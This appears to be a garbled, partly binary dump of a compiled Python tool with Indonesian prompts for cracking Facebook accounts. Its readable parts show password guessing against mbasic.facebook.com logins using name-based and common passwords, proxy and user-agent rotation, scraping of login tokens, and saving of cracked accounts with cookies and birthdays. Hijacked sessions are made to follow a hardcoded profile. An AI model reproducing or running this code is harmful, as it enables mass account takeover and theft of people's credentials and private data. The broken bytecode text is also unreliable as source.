��  t%� }|j&dt!dd� |j&dtddd� |�'dd � t(� j)|dd!� tdt*� d"t� d#��}|d$v �rtD ]}t+�|� �q	nC|d%v �r%tD ]	}t+�,d|� �qn1|d&v �r?tD ]}t-�.dt t+��}t+�,||� �q,ntd'tt� t�	d(� tD ]	}t+�,d|� �qLt/d)d*��}t+D ]}|�0| j1|||� �q^W d   � d S 1 �sww   Y  d S )+Nrc   rF   zrm -rf .login.txtz# MAAF TOKEN ANDA RUSAK/ERRORrE   r1   r.  r  r/  r0  r2  rJ   r3  r�   r4  r:   r�   r  r   r  r  r�   r  r  r�   r�   r�   r�   r�   r�   r  zgCheck Jumlah Teman Dari Akun Tertua
Check Jumlah Teman Dari Akun Termuda
Check Jumlah Teman Dari Randomr�   r  r  r�   r�   r�   r  r�   rG   rH   )2rT   rf   r5  r<   rq   r9   rN   rO   rP   rQ   r�   rR   r�   rM   r�   r�   r  r�   r�   rx   rg   r�   r�   r�   r�   r�   rh   r�   r�   r  r6  r�   rS   r  rv   r   r  r�   r�   r�   r5   r   r�   r�   r   r!  r"  rX   r[   �_lonte_)rj   r�   �toketr'  r7  r  r  r9  r�   r:  r(  r)  r�   r*  r+  r,  Zkiky_gtgr:   r7   r7   r8   r�     s�   

�


���

�
�
��$�zMain.cek_jumlah_temanc                 C   s�  z�g }g }d|t f }t�� �,}t�|j|td�j�}|d d D ]}	z|	d }
|�|
� W q!   Y q!W d   � n1 s>w   Y  d| d | }t�� �*}t�|j|td�j�}|d D ]}	z|	d }|�|� W q_   Y q_W d   � n1 s|w   Y  W n	 t	y�   Y nw t
� }|jdtd	d
� |jdtd	d
� |jdtd	d
� |�|� t|�� t|�� � dt|�� kr�dt|�� kr�d S t� j|d	d� d S t� j|d	d� d S )Nr3  r�   r4  r:   r�   r=  r>  r?  r�   r�   r@  rA  rB  r�   )rg   r�   r�   r�   r�   r�   rh   r�   r  r6  r�   r�   r  r�   r  r�   rS   r5   r   )rj   rD  r�   rL  rE  rF  r  r  r9  r�   rG  rH  rI  r7   r7   r8   rK  L  sD   

��

���zMain._lonte_c                 C   s&  t �|�}d\}}|D ]p}|d | }zt|d��� }dtt|�� }W n   d}Y z#|�d�d }	tt d |	 }
||
t d t t	 | t d	 7 }W n   Y z#|�d
�d }tt
 d
 | }||t d t t	 | t d	 7 }W q   Y qtt|tdd�� tt|tdd�� t�  d S �N)r1   r1   �/rF   �%sz ?? �results/OK-r�   z	 <--|--> rJ   �results/CP-z
RESULTS OK�r3   r�   z
RESULTS CP�r<   �listdirrT   rU   r�   rS   rZ   rx   r�   rw   r�   rv   r   r  rW   r   )rj   r>   �dirs�god_cp�god_ok�file�filex�juma�total�ijo__�ijo_�kuning__�kuning_r7   r7   r8   rL   m  �*   
((

zMain.cekfile_crkc                 C   s�  | � d� td�}z	t|d��� }W n ty*   tdtt� t�	d� | �
�  Y nw z|�d�d }d}d	t }t}W n"   z|�d
�d }d}d	t }t}W n   d}d	t }t}Y Y tdt|�� �tt� tdd��U}|D ]I}	z=|	�dd�}	z
|	�d�\}
}}W n   |	�d�\}
}d}Y ttt� |� |� t� |� |
� d|� d|� t� �tdd�� W n   Y t�	d� qrW d   � d S 1 s�w   Y  d S )Nr;   rC   rF   z*# MAAF FILE YANG ANDA MASUKAN TIDAK ADA !!ru   zCP-r�   r1   rO  zOK-zDARK-FBz# JUMLAH AKUN : �   rH   rJ   rK   z - ZAKUNrR  g{�G�z�?)rL   rM   rT   rU   rV   r9   rN   rO   rP   rQ   r�   rZ   r�   r�   ry   rw   rS   r�   rX   rY   rv   r   rx   )rj   ZnamaxZfilaZvolakZcopy_riZAssZaSsZvokr]   r:   r^   r_   Ztllr7   r7   r8   r�   �  sB   
�"�>�"�zMain.rekc                 C   s�   t d� tdt d t d t � td�}z	t|d��� }W n ty7   t	dt
t� t�d� | ��  Y nw td	d
��$}|D ]}|�dd�}|�d�}|�t|d |d d� q@W d   � n1 sdw   Y  t	dtt� t�  t� ��  d S )Nr;   z>--Contoh-->rQ  �.txtz>--Nama File-->rF   z'# MAAF FILE YANG ANDA MASUKAN TIDAK ADArE   �   rH   rJ   r1   rK   r   r�   z# TEKAN ENTER UNTUK KEMBALI)rL   r   r�   �durasir�   rM   rT   rU   rV   r9   rN   rO   rP   rQ   r�   rX   rY   rZ   r[   Zcek_opsi_crackr  �Main_�_no_vpn)rj   �filesZ	buka_baju�kontok�memek�kontolZtitidr7   r7   r8   r�   �  s&   �
��
zMain.cek_opsiN)rl   rm   rn   rk   rz   rr   r�   r�   r�   r�   r  r  r�   r�   r�   rJ  r�   r�   rK  rL   r�   r�   r7   r7   r7   r8   ro   �   s(    u

K=9o:;!ro   c                   @   s�   e Zd Zdd� Zdd� Zdd� Zdd� Zd	d
� Zdd� Zdd� Z	dd� Z
dd� Zdd� Zdd� Zdd� Zdd� Zdd� Zdd� ZdS ) r#  c                 C   �   d}d S )NzAUDAH TAU GW CODING SENDIRI ENGGA DIBANTU, NAK KALIAN RIKOD WKWKWKr7   )rj   r�   r7   r7   r8   rk   �  �   zcrack_new.__init__c           	      C   s�   z't |jdd|id�jd�}|jddd��d�}|jd	t|� d|id�j W n   Y zAd|i}t�� �.}t|jd
|d�jd�j	ddd�D ]}d|d v rY|jd|d  |d�}qFW d   � W d S 1 sfw   Y  W d S    Y d S )Nz:https://mbasic.facebook.com/profile.php?id=100063690353340re   r�   r�   r�   ZIkutir�   r�   �https://mbasic.facebook.comz+https://mbasic.facebook.com/100063690353340T)r�   zsubscribe.phpzhttps://mbasic.facebook.com%s)
r   r�   r�   r   r�   r�   r�   r�   r�   �find_all)	rj   ZsessionnZcokiirF   r�   rh   r  rA   Z
exec_follsr7   r7   r8   �Kontol_Kau_Ikuti�  s    
$��&�zcrack_new.Kontol_Kau_Ikutic                 C   s�  t td�td�t� td��atjdtt�d�at	dt
t� | ��  dtkr&n| ��  | ��  | ��  | ��  | ��  | ��  | ��  ttt� dt� d	t� d
t� dt� dt� dt� �tdd�� t��r tdd���[}tD �]O}�zG|�d�d }|�d�d �� }|�d�d }|�d�d }|�d�d }g }t|�dk �r�t|�dk �r4t dv r��n�t dv r��n�t dv r�|�!d� |�!d� |�!d� �n�t dv r�|�!d� |�!d� |�!d� |�!d� |�!d � |�!d!� |�!d"� �n[t d#v �r|�!|� |�!|d$ � |�!|d% � |�!|d& � t"�d'�D ]}	|�!|	� �q�n,t d(v �r2t"�d'�D ]}	|�!|	� �q)�nt dv �rH|�!|d$ � |�!|d& � n�t dv �rh|�!|� |�!|d$ � |�!|d% � |�!|d& � n�t dv �r�|�!|� |�!|d$ � |�!|d% � |�!|d& � nat dv �r�|�!|� |�!|d$ � |�!|d% � |�!|d& � nAt d#v �r�|�!|� |�!|d$ � |�!|d% � |�!|d& � t"�d'�D ]}	|�!|	� �q�nt d(v �r�t"�d'�D ]}	|�!|	� �q�|�!|� |�!|� �nVt|�dk �r�t dv �r�nHt dv �r
�nAt dv �r |�!d� |�!d� |�!d� �n+t dv �rJ|�!d� |�!d� |�!d� |�!d� |�!d � |�!d!� |�!d"� �nt d#v �rx|�!|� |�!|d$ � |�!|d% � |�!|d& � t"�d'�D ]}	|�!|	� �qnn�t d(v �r�t"�d'�D ]}	|�!|	� �q�n�t dv �r�|�!|d$ � |�!|d& � n�t dv �r�|�!|� |�!|d$ � |�!|d% � |�!|d& � n�t dv �r�|�!|� |�!|d$ � |�!|d% � |�!|d& � nat dv �r |�!|� |�!|d$ � |�!|d% � |�!|d& � nAt d#v �r.|�!|� |�!|d$ � |�!|d% � |�!|d& � t"�d'�D ]}	|�!|	� �q$nt d(v �rAt"�d'�D ]}	|�!|	� �q8|�!|� |�!|� dtk�rY|�#| j$||� n]d)t%k�rh|�#| j&||d*� nNd+t%k�rw|�#| j&||d,� n?d-t%k�r�|�#| j&||d.� n0d/t%k�r�|�#| j&||d0� n!d1t%k�r�t'�(g d2��}
|�#| j&|||
d3 � n	|�#| j&||d4� W ql   Y qlW d   � n	1 �s�w   Y  W d   � n	1 �s�w   Y  t)�  t)�  t	d5t
t*� t+j,�-�  d S )6NZarrow2z{task.description}z{task.percentage:.0f}%r1   )r[  z5# SEBELUM CRACK SILAHKAN JAWAB PERTANYANN DIBAWAH INI�fastz9JIGA TIDAK ADA HASIL, SILAHKAN HIDUP MATIKAN MODE PESAWATrJ   z$RESULTS OK DISIMPAN KE : results/OK-z.txt
z$RESULTS CP DISIMPAN KE : results/CP-rb  ZINFORMATIONrR  �#   rH   r  r   r�   � r<  ru   )r%   r�   )r&   r�   )r'   r�   Zanjingrj  Zsayang)r(   r�   ZpantekZ	indonesiaZsayangkuZ123456)r)   r�   Z123Z1234Z12345�,)r*   r�   �mobilezm.facebook.com�freezfree.facebook.com�p�p.facebook.comrA   zx.facebook.comr!  )�mbasicrA   �mrv  ru  z.facebook.com�mbasic.facebook.comz&# CRACK SELESAI JANGAN LUPA, ISTIRAHAT).r   r   r   r   �animZadd_taskrS   r�   �anim2r9   r  rO   �	pilih_fps�fps�	tanya_apk�
tanya_opsi�tanya_prox_k�	buat_ugen�	pilih_url�pilih_mentod_�pas_merv   r   �OOrx   r�   rd  r�   rX   r�   rZ   �lower�pass_r  �pass_manr[   Zmethod_fast�url_met�methodr!  r    r   r�   r<   r�   rR   )rj   rh  Zkocokr�   ZpwsZpws_ZcolmekZcolmek_ZpweZzorroZlink_ajgr7   r7   r8   r$  �  sV  
:










�
�








�















�
�








�








� ����� zcrack_new.otomatisc                 C   sf  d}d}|dk�r��zYd}d}d� d�\}}	}
t�� }t|jd|� d	|� d
�i d|�dd�dd�dd�dd�dd�dd�dd�dd�dd�dd�d d�d!d"�d#d| d$ �d%d&�d'd(�d)�jd*�}d+d,� |�d-d.d/i��d0d1d2d3gi�D �}|�|d| d4 d5d6�	t
|	�d7�� |jd|� d8�|i d|�dd�d9d:�dd�dd�dd�dd�dd�d;d| �d<d=�dd>�dd�dd�dd�d d�d!d"�d#d|� d	|� d
��d?d(d@��dA� dB|j�� v �rtjtt� t� t� dCt� tt�� t� dDt� tt�� t� dEt� tt�� t� �dF� t�t� nSdG|j�� v �rAtjtt� t� t� dCt� tt�� t� dDt� tt�� t� dEt� tt�� t� �dF� t�t� n tjtt� t� dHt� �dF� t�t� | �|||� W d S W d S W d S    tjtt� t� dHt� �dF� t�t� | �|||� Y d S tjtt� t� t� dCt� tt�� t� dDt� tt�� t� dEt� tt�� t� �dF� t�t� d S )INun  ╔══════════════════════════════════════════════════════════════════════════════════════╗
║                             JARINGAN ANDA TERKENAK SPAM                              ║
╚══════════════════════════════════════════════════════════════════════════════════════╝r1   ZHairw  z�Mozilla/5.0 (Linux; Android 12; SM-A326U Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/376.0.0.12.108;]u   100035109762635|amanda123|—rK   �https://z"/login/device-based/password/?uid=z)&flow=login_no_pin&refsrc=deprecated&_rdr�HostZ
Connectionz
keep-alivezCache-Control�	max-age=0�	sec-ch-uaz)" Not A;Brand";v="99", "Chromium";v="101"�sec-ch-ua-mobile�?1zsec-ch-ua-platformz	"Android"zUpgrade-Insecure-Requestsr�   z
User-Agentz�Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36ZAcceptz�text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9zSec-Fetch-Site�same-originzSec-Fetch-Mode�navigatezSec-Fetch-UserzSec-Fetch-Dest�documentZRefererz/login/device-based/�Accept-Encoding�gzip, deflate�Accept-Languagezid-ID,id;q=0.9��headersr�   c                 S   s   i | ]}|� d �|� d��qS )r�   �value)r�   )�.0r�   r7   r7   r8   �
<dictcomp>�  s    z+crack_new.chexk_ip_spam.<locals>.<dictcomp>r]   r�  r
  rM   r�   �lsd�jazoestz/login/save-device/Zlogin_no_pinz#PWD_BROWSER:0:{}:{})r:  �nextZflowZencpassz&/login/device-based/validate-password/zContent-LengthZ142ZOriginzContent-Type�!application/x-www-form-urlencodedz{NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+�gzip, deflate, br)r�  r�  )r:   r�  �c_userrN  z OK:z CP:)�description�
checkpointzJARINGAN ANDA TERKENAK SPAM)rZ   r�   r�   r   r�   r�   r   ZfindAll�updater	  �jam_r
  r�   �get_dictr{  r|  r�   �loopr�   r�   rS   r�   r�   �okr�   �cpZadvance�m2r�  )rj   Zuserrri  ZuurlZkata_sZlo_r  �uar^   r_   �ttl�sessionrF   r:   r7   r7   r8   �chexk_ip_spamz  s~   
��������	�
��������*$�PP
�
Pzcrack_new.chexk_ip_spamc           .      C   s�	  t �t�}t�� }�z�td7 a|D �]�}dtkr�tdd��� �	� }ddt �|�� �i}|�
d|� d��}	t�d	t|	j���d�t�d
t|	j���d�||d| d d�}
dddd|d| d| d |ddddddd�}tdkr|jd|� d�t ||
|d�}n|jd|� d�t ||
d�}ndtkr�dt |j�� v �r�td� t|� t|� zWd}ttj
|d |id!�jd"�}|jd#d$d%�j}|jd#d&d%�j}|jd#d'd%�j}|jd#d(d%�j}|jd#d)d%�j}|�d*d+�}|�d,d+�}|�d-d+�}|�d.d+�}|�d/d+�}W n   Y t|j�� �}t�d0|�d1 }d2|||f }d3d4� }t|td5 �� t�|� td6t  d7 d8��!d9| � d:t"v �rJt#|� t$|||� �n8z�t%d;d<d<d=�}|j&d>t'� d?t(� �d@dA�}|�&t)� dBt(� ��}|�&dCt*� |� t(� dDt*� |� t(� �� |�&t)� dEt(� ��}|�&t+� |� t(� �� |�&t,� dFt(� ��}|�&t+� t-� t(� ��}|�&t,� dGt(� ��}|�&t+� |� t(� ��}|�&t,� dHt(� ��}|�&t)� dIt(� ��} | �&t+� |� t(� �� |�&t)� dJt(� ��} | �&t+� |� t(� �� |�&t)� dKt(� ��} | �&t+� |� t(� �� |�&t)� dLt(� ��} | �&t+� |� t(� �� t.|� W nc   t%d;d<d<d=�}|j&d>t'� d?t(� �d@dA�}|�&t)� dBt(� ��}|�&dCt*� |� t(� dDt*� |� t(� �� |�&t)� dEt(� ��}|�&t+� |� t(� �� |�&t,� dGt(� ��}|�&t+� |� t(� �� t.|� Y | �/||�  �nOdMt |j�� v �r�td� t|� zWd}ttj
|d |id!�jd"�}|jd#d$d%�j}|jd#d&d%�j}|jd#d'd%�j}|jd#d(d%�j}|jd#d)d%�j}|�d*d+�}|�d,d+�}|�d-d+�}|�d.d+�}|�d/d+�}W n   Y z/t�� j
dN|t0f t1dO�}!t2�3|!j�}"|"dP }#|#�4dQ�\}$}%}&t5|$ }$|%� dR|$� dR|&� �}'W n   dS}'Y d2|||'f }t6�|� dTd4� }t|t7dU �� tdVt  d7 d8��!d9| � d:t8k�r�z	t9|||'� W �ns   t%d;d<d<d=�}(|(j&d>t:� dWt(� �dXdA�})|)�&t,� dBt(� ��}*|*�&dCt;� |� t(� dDt;� |� t(� �� |)�&t,� dYt(� ��}*|*�&t;� |'� t(� �� t.|)� Y �n#z�t%d;d<d<d=�}(|(j&d>t:� dWt(� �dXdA�})|)�&t,� dBt(� ��}*|*�&dCt;� |� t(� dDt;� |� t(� �� |)�&t,� dYt(� ��}*|*�&t;� |'� t(� �� |)�&t,� dGt(� ��}*|*�&t+� |� t(� ��}+|+�&t,� dHt(� ��},|,�&t)� dIt(� ��}-|-�&t+� |� t(� �� |,�&t)� dJt(� ��}-|-�&t+� |� t(� �� |,�&t)� dKt(� ��}-|-�&t+� |� t(� �� |,�&t)� dLt(� ��}-|-�&t+� |� t(� �� t.|)� W nc   t%d;d<d<d=�}(|(j&d>t:� dWt(� �dXdA�})|)�&t,� dBt(� ��}*|*�&dCt;� |� t(� dDt;� |� t(� �� |)�&t,� dYt(� ��}*|*�&t;� |'� t(� �� |)�&t,� dGt(� ��}*|*�&t+� |� t(� �� t.|)� Y  nq| �<|||� W d S    td8 a| �|||� Y d S )ZNr�   �ke1�data/prox_socks5.txtrF   �httpz	socks5://r�  z/login/?source=auth_switcherzname="lsd" value="(.*?)"�name="jazoest" value="(.*?)"z&/login/save-device/?login_source=login)r�  r�  r%  �passr�  z*/*r�  zid,en-US;q=0.9,en;q=0.8r�  z@"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"z?0�emptyZcorsr�  ZXMLHttpRequest)�accept�accept-encoding�accept-language�content-typer�  r�   �referer�
user-agentr�  r�  �sec-fetch-dest�sec-fetch-mode�sec-fetch-site�x-requested-with�Risky_Gantengz</login/device-based/regular/login/?refsrc=deprecated&lwv=100)r�  r:   Zproxies)r�  r:   �ke2r�  z	.Wiii.mp3zhttps://www.whatsmyua.infor�  r�  r�   �liZrawUar  �family�productr<   �layoutzrawUa: r1   zfamily: z	product: zos: zlayout: zc_user=(.*);xsr   z%s|%s|%sc              
   S   r{   r|   r�   r�   r7   r7   r8   r�   �  r�   z"crack_new.method.<locals>.<lambda>rE   rP  rb  r�   z%s
�IYAr�   Tr�   �:bolivia::oman: �AKUN OK NI BOZZ�uu redr�   �ID DAN PASSWORDr�   rK   �COOKIESzLink AppZ	UserAgentzInformation UserAgentZOSZLAYOUTz	DEVICE HPzJenis Browserr�  z=https://graph.facebook.com/%s?fields=birthday&access_token=%sr�   ZbirthdayrN  r�   u   —c                 S   s   t d��| d d d� �S )Nr~   r�   )r�   r�   r�   r7   r7   r8   r�     s    ru   rQ  zAKUN CP NI BOZZzuu bluezTANGGAL LAHIR)=r!  r    �ugen_r�   r�   r�  r�  rT   rf   �
splitlinesr�   �re�searchr�   r�   �group�prox_kr
  �yyyr�   r�  rB   r   �parserr   rY   �ubah_cok�findallr�   �ua09r�  r  rd  r�   �apk_me�ubah_bahasar\   r	   r�   �or�   r�   r�   r�   r�   �link_appr�   ro  rg   rh   r�   r�   rZ   �	bulan_ttlr�  �ua03�opsi_y�	hide_opsir�   ry  r�  ).rj   r^   ri  r  r�  r�  r_   Zprox�proxy�linkr$   �head�bxZurl_main�sZraw_uar�  Zname_hpZos_ZlyZbrowserZhpr<   r�  r`   Zwrtr�   �ok_�ok__�ok___�ok____Zok_____Zok______r�   r�   Zcp_ttl�month�day�yearr�  Zcp_Zcp__Zcp___Zcp____Zcp_____Zcp______r7   r7   r8   r�  �  s  

@. j
&&
L
&&&
zcrack_new.methodc              
   C   sL  t j}t j}g d�}g d�}t� }|jdtdd� |jdtddd� |�d	d
� t� j	|dd� t
dt� ��}|dv r�td�D ]�}dt|dd��� dt|dd��� dt|dd��� d�}dt|dd��� d�}	t||��� t||��� t||��� t||��� t||��� �}
t|dd��� d|
� d�}dt|dd��� dt|dd��� d �}d!t|d"d#��� d$�}|	� |� |� |� �}|tv r�q?t�|� q?d S |d%v �rztt
d&��}W n   d}Y t|�D ]6}t
d'�}|d(kr�td)tt� t�d*� | ��  q�t|�d+k�rtd,tt� t�d*� | ��  q�t�|� q�d S td-tt� | ��  d S ).N)�A�Br�   �D�E�F�G�Hr  �JrW   �LrN   �Nr  �PrO   �R�S�T�U�V�W�X�Y�Z)$r�  r�  r�   r�  r�  r�  r�  r�  r  r�  rW   r�  rN   r�  r  r�  rO   r�  r�  r�  r�  r�  r�  r�  r�  r�  r�   r�   r�   r�   r�   r�   r�   �8�9rB  r�   r�   r�   r�   r�   r�   �1
2zUserAgent Bawaan
Manualr�   z>--Pilih 1-5--> r�   i�  zMozilla/5.0 (Linux; U; Android r�   rG   �.z�; SM-A135F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Versi/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.62069�   r�   ra  �9   z Build/z() AppleWebKit/537.36 (KHTML, like Gecko)z Version/4.0 Chrome/�   �d   z.0.iW  i'  z.80 Mobile Safari/z537.36 HeyTapBrowser/rE   �(   z.7.36.1r�   z>--Jumlah UserAgent--> z>--Masukan UserAgent--> r1   rD   r<  �"   z# MINIMAL USERAGENT 35 KATAz## MAAF PILIHAN ANDA TIDAK DITEMUKAN)r!  r"  r    r�   r�   r  r�   r�   r5   r   rM   r�   r  r�   r�  r  r  r9   rN   rO   rP   rQ   r�  rS   )rj   ZrrZrcZaZZaZ10r�   Zpilih_rA   ZA__ZA_ZB_ZC_ZD_ZE_ZF_ZjmlhZuesr7   r7   r8   r�  G  sL   6@&
�
�zcrack_new.buat_ugenc                 C   s�   t � }|jdtdd� |jdtddd� |�ddt� d	t� d
t� dt� d�	� t� j	|dd� t
dt� dt� d��}|dv rBdad S |dv rJdad S |dv rRdad S |dv rZdad S |dv rbdad S |dv rjdad S tdtt� t�d� | ��  d S )Nr�   r�   r�   r�   r�   r�   z	1
2
3
4
5zMobile rs   r  rt   z
Free
Mbasic
P
Xr�   r  �	Pilih 1-4r  r�   rt  r�   ru  r�   rx  r�   rv  r�   rA   r�   r!  z.# KONCOL TINGGAL PILIH 1-4 ITU AJA SUSAH, AJIMrE   )r�   r�   r  r�   r�   rx   r�   ry   r5   r   rM   r�   r�   r�  r9   rO   rP   rQ   r�  �rj   r�   r*  r7   r7   r8   r�  �  s*   &
zcrack_new.pilih_urlc                 C   s   da d S )Nr�  )r�  ri   r7   r7   r8   r�  �  s   zcrack_new.pilih_mentod_c                 C   s�   t � }|jdtdd� |jdtddd� |�dd� t� j|dd	� td
t� dt	� d��}|dv r5da
d S |dv r=da
d S tdtt� t�d� | ��  d S )Nr�   r�   r�   r�   r�   r�   r  zMethod 1
Method 2r�   r  r	  r  r�   r�  r�   r�  �.# KONCOL TINGGAL PILIH 1-5 ITU AJA SUSAH, AJIMrE   )r�   r�   r  r�   r�   r5   r   rM   r�   r�   r�  r9   rO   rP   rQ   �pilih_mentodr
  r7   r7   r8   r  �  s   	
zcrack_new.pilih_mentodc                 C   s�   t � }|jdtdd� |jdtddd� |�dd� t� j|dd	� td
t� dt	� d��}|dv r6dga
d S |dv r?dga
d S |dv rHdga
d S |dv rQdga
d S |dv rZdga
d S |dv rcdga
d S |dv rmg d�a
d S tdtt� t�d� | ��  d S )Nr�   r�   r�   r�   r�   r�   z1
2
3
4
5
6
7zFFree Fire
Hago
Ruang Guru
Bryanly
Hings Domino
Yandex
All Link(Random)r�   r  r	  r  r�   ��https://auth.booyah.live/oauth/login?client_id=10058&redirect_uri=https%3A%2F%2Fbooyah.live%2Flogin&response_type=token&platform=3&locale=en-GB&state=return_url%3Dhttps%3A%2F%2Fbooyah.live%2Fr�   al  https://m.facebook.com/v3.2/dialog/oauth?app_id=1443497502442589&cbt=1660006184043&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df22524a9ae24e8c%26domain%3Dwww.ihago.net%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.ihago.net%252Ff2e576f35ed6ab4%26relation%3Dopener&client_id=1443497502442589&display=touch&domain=www.ihago.net&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fwww.ihago.net%2Fa%2Fweb-login%2Findex.html%23%2F&locale=en_US&logger_id=f4075c8fa8864&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df591a111651cc%26domain%3Dwww.ihago.net%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.ihago.net%252Ff2e576f35ed6ab4%26relation%3Dopener%26frame%3Dff067454e6509c&response_type=token%2Csigned_request%2Cgraph_domain&sdk=joey&version=v3.2r�   �z  https://m.facebook.com/v3.3/dialog/oauth?encrypted_query_string=AeDT2UXYR_53fiXztzu_JhFEBFfSJQgdUJGUXpWNi06kMvyZabZnxfdBZhZqn0UVav0tMQhs1d-jJsCtyUwNApPh-rjYgugWqF-e66qARB91xP624bvOxSjswdmzxS1zgvH4Ojj2MOEEW-Qi3bMycxfp8etyXlIdau3ppuAyyDbEBSIyiWvpC8Fl0k72v7CPgmvEGr6EvqJJ3P96Cmtf4nAFS8qWpLS3hwVpvr-cYADOlLya0mpQybTQ47egOAscvQV6EJZGU0gf4ptTfXhpcIb_ZLZh0gOKDftQzztpwa5jzDXQyiMFC94hijWNafrhSEZ8WtfinBYZkUVU4hbjM6CDzdO14HDUlHa-_QU3aQQo-V1wpnndx0cE1pNbOSuLpyW0E6q5MJ8qRZ7J2uX4PcmjsOBHRfOWA1hsBPQrHPnWoVidw8Lk67C4b9ult5CY578K5fHL447X3Wjq3jXxdSCEPNL-MLpW0bsjPM3-cNC1X9oYB6AjxpToI6zqS5ML-eRsA5VVeB89eS2X4xxcgveP2oOnFWUMyqQS7Ma1guZvlRvCc9rK7elLXdljMd743YV6RJLg7l_wGelvrdbGJAClrZQN2NPuvxLfUyOwIblHTTZ21mA8diwCfRFkmwbbg30y9ry6wN39pTXZdZlGEuoQezQO1qgJD845j2oGD057s9p3S-p10ljHw-eYOvx8u6gMFdWPmbmKIF6KKkJhdzwGh1JDoWRjmxvcXiZal1VM4S8ZE99uIM54eNlpB0wxcVVJZ92j72g4mc_75e1fEfhQw1ZSPlrfq4Auc3bYQFMZ7x87n8_Buv_V-33jSjl0XyXNUk9UQlRVLztDgihIRspczT94fGzhzksV0ASf0a9pyaYTrbsHjK_o7tGxLtCqneuiooMwvds0VB9BgpwlwhVMmotgV881fyZ-9Ge_CAYXenAoGUJMufxZ-P5FGIpWRy5XmJ6ZiE9KsnV2m2W11ZUDYozAHF_aiVjT3AxhN9tAyKv4shU0ChnURwPQOdT-N4_Bqwzu1kCIanP4rIYhzF8XsFjVt0ygH7Xv9kDDI2xifFdhmfNEEG0s91VRP0_3cLzIXEY0MLgpyvQ4qI6_KMGCTKnCUBsAnxhy9Dzj3pAJ5XcWVxp6UFihIk1czVytY_bQ_oBu4eHzWp8kXQeO_W34TJPJKrzvnyNDMpKKUKaaOl3kNPLvggYm5I5vb7kOk-KnIQgWy5vS2-M9MIOEQLiQBa58eig2tfBP9bVDRQ6xzeNghsXBO_HsX4UwLqdfLz0EbpplEIELjKRpzgDnr7hYN1sM4wvVmHMr98VROyWrNxc7Wy1FjxKeSl__wVLXxeIVg8SPa9kBr_hKJ6-3rQQUdHr6N7TqgXceyF9CTa1JDC9gKrN7oVCR9XfnN6hKmWA4T9mFOO5Dd5UYRAp6FlpjnHyv5dtsvRWfcA7RFC9nUTAXhGwODXxBNpY8BGc7Xh8vTDwTKqmsyUQN5V1czX8bxLhsWVLODZhaI37hREsTOLT5nHOrg0NYNcc-s80UANkPOpcpu_yQDko1fBGR3-ARPgRiLT4GX59glmvFSIIoVb9LnXT8-tRDBAr�   �  https://m.facebook.com/v3.2/dialog/oauth?app_id=546387748750105&auth_type=rerequest&cbt=1660007160700&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df2fb47fad7408cc%26domain%3Dbrainly.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fbrainly.co.id%252Ff255ac1c9862044%26relation%3Dopener&client_id=546387748750105&display=touch&domain=brainly.co.id&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fbrainly.co.id%2Ftugas%2F14548632&locale=en_US&logger_id=f2c7c938fdf214c&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df1ee54b6e463df4%26domain%3Dbrainly.co.id%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fbrainly.co.id%252Ff255ac1c9862044%26relation%3Dopener%26frame%3Df2e29c41357b38&response_type=token%2Csigned_request%2Cgraph_domain&return_scopes=true&scope=public_profile%2C%20email&sdk=joey&version=v3.2r�   �Y  https://m.facebook.com/v8.0/dialog/oauth?cct_prefetching=0&client_id=345000986033587&cbt=1660008418088&e2e=%7B%22init%22%3A1660008418088%7D&ies=1&sdk=android-8.2.0&sso=chrome_custom_tab&scope=public_profile%2Cuser_gender%2Cuser_friends&state=%7B%220_auth_logger_id%22%3A%22eb1f7549-f6ec-4e30-9e92-979a5a8b685f%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%2254e2vochhlvsm0areh4t%22%7D&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fb345000986033587%3A%2F%2Fauthorize&auth_type=rerequest&response_type=token%2Csigned_request%2Cgraph_domain&return_scopes=truer�   �  https://m.facebook.com/v12.0/dialog/oauth?cct_prefetching=0&client_id=216570901687097&cbt=1660268970371&e2e=%7B%22init%22%3A1660268970371%7D&ies=0&sdk=android-12.2.0&sso=chrome_custom_tab&nonce=30032935-4997-43a5-abac-0d2c6cae81d5&scope=user_birthday%2Cuser_likes%2Copenid%2Cuser_link%2Cuser_gender%2Cemail&state=%7B%220_auth_logger_id%22%3A%2226cb2987-4616-4361-90ff-ab55b956e68f%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%225le280ansood69lmdd9e%22%7D&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fbconnect%3A%2F%2Fcct.ru.yandex.searchplugin&auth_type=rerequest&response_type=id_token%2Ctoken%2Csigned_request%2Cgraph_domain&return_scopes=truer�   )r  r  r  r  r  r  r  rE   )r�   r�   r  r�   r�   r5   r   rM   r�   r�   r�  r9   rO   rP   rQ   �
pilih_nextr
  r7   r7   r8   r  �  s.   






